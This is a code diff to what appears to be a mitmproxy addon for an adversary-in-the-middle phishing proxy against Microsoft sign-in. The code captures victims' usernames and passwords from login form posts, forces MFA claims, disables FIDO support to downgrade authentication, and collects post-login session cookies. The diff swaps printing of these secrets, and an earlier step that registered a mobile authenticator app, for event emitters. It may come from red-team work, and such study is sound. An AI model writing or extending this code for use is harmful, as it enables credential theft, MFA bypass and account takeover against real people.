@@ -4,15 +4,15 @@ Modifier Addon for mitmproxy.
 
 from __future__ import annotations
 
-import json
 import logging
 from http.cookies import SimpleCookie
 
 from mitmproxy.http import HTTPFlow
 
 from .aitm_config import config
+from .events import CredentialsCapturedEvent, EventEmitter, MfaSessionCapturedEvent
+from .events.emitter import EventEmitter
 from .helpers import cookies, requests, responses
-from .msft_aama import register_mobile_app
 
 logger = logging.getLogger(__name__)
 
@@ -26,6 +26,7 @@ class ModifierAddon:
 
     credentials: dict[str, str] = {}
     simple_cookie: SimpleCookie = SimpleCookie()
+    event_emitter: EventEmitter = EventEmitter()
 
     def request(self, flow: HTTPFlow) -> None:
         """
@@ -50,8 +51,9 @@ class ModifierAddon:
         if flow.request.path.startswith("/common/oauth2/v2.0/authorize"):
             flow.request.query["claims"] = config.mfa_claim
         if flow.request.path.startswith("/common/login"):
-            self.credentials["login"] = flow.request.urlencoded_form["login"]
-            self.credentials["passwd"] = flow.request.urlencoded_form["passwd"]
+            self.event_emitter.notify(
+                CredentialsCapturedEvent(flow.request.urlencoded_form["login"], flow.request.urlencoded_form["passwd"])
+            )
             flow.request.urlencoded_form["IsFidoSupported"] = "0"
 
     def response(self, flow: HTTPFlow) -> None:
@@ -74,12 +76,6 @@ class ModifierAddon:
         responses.modify_content(flow)
 
         if flow.request.path in config.auth_url and flow.request.host != config.local_upstream_hostname:
-            parsed_cookies = cookies.parse_cookies(self.simple_cookie)
-            try:
-                secret_key = register_mobile_app(parsed_cookies, flow.request.headers["User-Agent"])
-                print(secret_key)
-            except AssertionError:
-                pass
-
-            print(json.dumps(parsed_cookies))
-            print(self.credentials)
+            self.event_emitter.notify(
+                MfaSessionCapturedEvent(cookies.parse_cookies(self.simple_cookie), flow.request.headers["User-Agent"])
+            )
